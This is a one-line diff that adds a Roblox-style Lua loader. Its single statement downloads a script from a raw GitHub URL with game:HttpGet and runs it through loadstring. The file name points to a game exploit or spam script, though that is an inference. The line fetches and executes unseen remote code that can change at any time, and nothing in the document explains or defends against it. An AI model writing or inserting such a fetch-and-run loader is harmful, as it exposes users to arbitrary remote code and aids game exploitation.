@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/the-eternal-abyss-spam4-w95a7hiahx7lr1.lua"))()
